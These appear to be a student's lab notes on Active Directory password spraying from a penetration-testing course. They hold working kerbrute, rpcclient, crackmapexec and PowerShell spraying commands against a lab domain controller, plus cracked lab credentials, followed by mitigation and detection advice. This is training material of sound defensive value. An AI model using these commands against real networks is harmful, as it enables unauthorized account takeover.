
1. We first need a valid list of users
	1. How?
	  - Leverage an SMB Null session
	  - Utilize LDAP anonymous bind
	  - User [[Kerbrute]] with a userlist

#### Use Kerbrute to get a list of valid users:
`sudo kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_users.txt
`

==You must keep a log of what you are doing==
Why? -> What if a malicious actor is in the network when you are as well? How would your client know?

## Internal Password Spraying with Linux:
1. Now that we have a valid list of usernames, we can attempt to spray passwords.

```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

##### Kerbrute:
```
# Spray the password: Welcome1 to all the users in 'valid_users.txt'

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
==Creds:== sgage:Welcome1[^1]
avazquez:Password123

> [!NOTE] Internal Spray with CrackMapExec
> ```shell-session
> # Use grep to show only successful sprays
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep + 


^ ^ Validate credentials with CME:
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123


### Test for password reuse!
1. If you gather admin credentials, try them in as many other places as possible in the domain
2. If a user has a standard account and an admin account, try the creds on the admin account as well.


## Internal Password spraying - From Windows:
==Connect==: `xfreerdp3 /v:<MS01 target IP> /u:htb-student /p:Academy_student_AD!`

COMMANDS:
```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

![[Pasted image 20250601151800.png]]

dbranch:Winter2022
### Mitigation of password spraying:
1. **MFA**: But the credentials can perhaps be used somewhere where MFA is not required
2. **Restricting Access**: Users should only have access to applications that they need to access.
3. **Reduce impact of successful exploitation**: Network segmentation, privileged users having separate accounts, Application specific permission levels
4. **Password Hygiene**: Educate users! Adopt a password phrase paradigm, have a dictionary that blocks the use of weak phrases (like "welcome!")

### Detection of password spraying:
1. Many account lockouts in a short period of time
2. Lots of event IDs of 4625 (An account failed to log on) ==for smb password spraying==
3. Lots of event IDs of 4771 (Kerberos pre-authentication failed) ==for LDAP password spraying
4. Enable logging

### External password spraying:
-> This can also be done with public facing applications including:

1. Microsoft 0365
2. Outlook Web Exchange
3. Exchange Web Access
4. Skype for Business
5. Lync Server
6. Microsoft Remote Desktop Services (RDS) Portals
7. Citrix portals using AD authentication
8. VDI implementations using AD authentication such as VMware Horizon
9. VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
10.  Custom web applications that use AD authentication